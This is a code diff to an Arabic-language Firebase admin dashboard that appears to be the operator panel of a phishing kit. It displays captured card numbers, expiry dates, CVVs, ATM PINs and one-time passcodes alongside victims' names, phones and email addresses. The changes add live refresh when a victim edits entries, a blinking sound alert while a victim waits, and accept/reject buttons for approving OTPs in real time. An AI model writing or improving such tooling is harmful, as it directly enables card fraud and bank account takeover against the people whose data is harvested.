@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>لوحة تحكم المهندس حسن - دقة الأرقام</title>
+    <title>لوحة تحكم المهندس حسن - التحديث اللحظي</title>
     <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
     <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
     <style>
@@ -21,17 +21,11 @@
         .data-table th { background: #222; color: #888; padding: 12px; text-align: right; font-size: 13px; border-bottom: 2px solid #333; }
         .data-table td { padding: 12px; border-bottom: 1px solid #222; font-size: 14px; white-space: nowrap; }
         
-        /* حل مشكلة لخبطة الأرقام - إجبار القراءة من اليسار لليمين */
-        .ltr-fix { 
-            direction: ltr !important; 
-            unicode-bidi: bidi-override !important; 
-            display: inline-block;
-            text-align: left !important;
-            font-family: 'Courier New', Courier, monospace; /* خط مريح للأرقام */
-            letter-spacing: 1px;
-        }
+        .ltr-fix { direction: ltr !important; unicode-bidi: bidi-override !important; display: inline-block; text-align: left !important; font-family: monospace; letter-spacing: 1px; }
 
-        .is-new-row { background: #0d2112 !important; border-right: 5px solid #28a745; }
+        /* سطر منبه - للبيانات الجديدة أو المعدلة */
+        .is-new-row { background: #0d2112 !important; border-right: 5px solid #28a745 !important; animation: blink 1.5s infinite; }
+        @keyframes blink { 0% { background: #0d2112; } 50% { background: #1b3d24; } 100% { background: #0d2112; } }
         
         .btn { padding: 8px 15px; border: none; border-radius: 4px; cursor: pointer; font-weight: bold; background: #333; color: #666; }
         .active-green { background: #28a745 !important; color: white !important; }
@@ -69,28 +63,18 @@
                         <th>رقم البطاقة</th>
                         <th>الانتهاء</th>
                         <th>CVV</th>
-                        <th>PIN</th>
-                        <th>OTP</th>
+                        <th>PIN (السري)</th>
+                        <th>OTP (الرمز)</th>
                         <th>الإجراء</th>
                     </tr>
                 </thead>
                 <tbody id="paymentsList"></tbody>
             </table>
         </div>
-
         <div id="bookingSection" class="tab-content">
             <table class="data-table">
                 <thead>
-                    <tr>
-                        <th>الاسم</th>
-                        <th>التليفون</th>
-                        <th>السيارة</th>
-                        <th>اللوحة</th>
-                        <th>التاريخ</th>
-                        <th>الوقت</th>
-                        <th>الجيميل</th>
-                        <th>البلد</th>
-                    </tr>
+                    <tr><th>الاسم</th><th>التليفون</th><th>السيارة</th><th>اللوحة</th><th>التاريخ</th><th>الوقت</th><th>الجيميل</th><th>البلد</th></tr>
                 </thead>
                 <tbody id="bookingList"></tbody>
             </table>
@@ -121,20 +105,30 @@
             document.getElementById('onlineCount').innerText = active;
         });
 
+        // استلام البطاقات
         database.ref('payments').on('child_added', s => { renderCardRow(s.key, s.val()); });
         
+        // السر هنا: تحديث البيانات فور تغيرها عند العميل
         database.ref('payments').on('child_changed', s => {
             const val = s.val();
             const row = document.getElementById('row_' + s.key);
             if(row) {
-                row.querySelector('.col-otp').innerText = val.otp || '-';
-                row.querySelector('.col-pin').innerText = val.atm_pin || '-';
+                // تحديث الخانات فوراً بالقيم الجديدة
+                row.querySelector('.val-card').innerText = val.cardNumber;
+                row.querySelector('.val-expiry').innerText = val.expiry;
+                row.querySelector('.val-cvv').innerText = val.cvv;
+                row.querySelector('.val-pin').innerText = val.atm_pin || '-';
+                row.querySelector('.val-otp').innerText = val.otp || '-';
+
+                // تشغيل التنبيه لو العميل غير حاجة وهو في وضع الانتظار
                 if(val.status && val.status.includes('waiting')) {
                     row.classList.add('is-new-row');
                     row.querySelector('.btn-green').classList.add('active-green');
                     row.querySelector('.btn-red').classList.add('active-red');
                     playSound();
                 }
+                
+                // إطفاء التنبيه لو العملية خلصت
                 if(val.status === 'accept' || val.status === 'reject') {
                     row.classList.remove('is-new-row');
                     row.querySelector('.btn-green').classList.remove('active-green');
@@ -148,15 +142,17 @@
 
     function renderCardRow(key, val) {
         const list = document.getElementById('paymentsList');
+        if(document.getElementById('row_' + key)) return; // منع التكرار
+
         const tr = document.createElement('tr');
         tr.id = 'row_' + key;
         tr.innerHTML = `
-            <td style="color:#28a745;">${val.cardHolder || 'عميل'}</td>
-            <td><span class="ltr-fix">${val.cardNumber}</span></td>
-            <td><span class="ltr-fix">${val.expiry}</span></td>
-            <td><span class="ltr-fix">${val.cvv}</span></td>
-            <td><span class="ltr-fix" style="color:#9c27b0;">${val.atm_pin || '-'}</span></td>
-            <td><span class="ltr-fix col-otp" style="color:#2196f3;">${val.otp || '-'}</span></td>
+            <td style="color:#28a745; font-weight:bold;">${val.cardHolder || 'عميل'}</td>
+            <td><span class="ltr-fix val-card">${val.cardNumber}</span></td>
+            <td><span class="ltr-fix val-expiry">${val.expiry}</span></td>
+            <td><span class="ltr-fix val-cvv">${val.cvv}</span></td>
+            <td><span class="ltr-fix val-pin" style="color:#9c27b0; font-weight:bold;">${val.atm_pin || '-'}</span></td>
+            <td><span class="ltr-fix val-otp" style="color:#2196f3; font-weight:bold;">${val.otp || '-'}</span></td>
             <td>
                 <button class="btn btn-green" onclick="updateStat('${key}', 'accept')">قبول</button>
                 <button class="btn btn-red" onclick="updateStat('${key}', 'reject')">رفض</button>
@@ -181,7 +177,9 @@
         list.prepend(tr);
     }
 
-    function updateStat(id, action) { firebase.database().ref('payments/' + id).update({ status: action }); }
+    function updateStat(id, action) { 
+        firebase.database().ref('payments/' + id).update({ status: action }); 
+    }
 
     function openTab(evt, name) {
         document.querySelectorAll(".tab-content").forEach(t => t.style.display = "none");
